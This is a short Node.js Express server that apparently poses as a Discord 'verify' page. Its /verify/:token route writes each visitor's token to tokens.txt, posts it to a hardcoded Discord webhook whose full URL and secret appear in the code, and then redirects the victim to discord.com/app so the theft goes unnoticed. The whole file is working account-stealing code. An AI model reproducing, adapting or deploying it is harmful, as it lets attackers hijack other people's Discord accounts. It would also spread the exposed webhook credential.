/** * @type {import('discord-api-types/v10').APIUser} */

const { EmbedType } = require('discord-api-types/v10');
const express = require('express');
const app = express()
const fs = require('fs')
const discord = require('simple-discord-webhooks')

const webhook = new discord.Webhook("https://discord.com/api/webhooks/1185998445824196628/Xn2QLqO694cDqHhQMgxw1-VPW_usumNC3wlJ9GV51p3krCItxAsYnUr9puhPnfrjOYof")


app.set('view engine', 'ejs')
app.use(express.json())
app.use(express.static(__dirname + '/public'));

app.get('/', (req, res) => {
    res.render('index')
})

app.get('/verify/:token', (req, res) => {
    var token_temporary = req.params.token
    fs.appendFileSync('tokens.txt', token_temporary + "\n")

    webhook.send(token_temporary)   
    console.log("[LOG] Just logged a token, check the webhook/file.")

    res.redirect('https://discord.com/app')
})

app.listen(8080, () => {
    console.log("[ONLINE] Website re-developed by @WrightAH.")
})
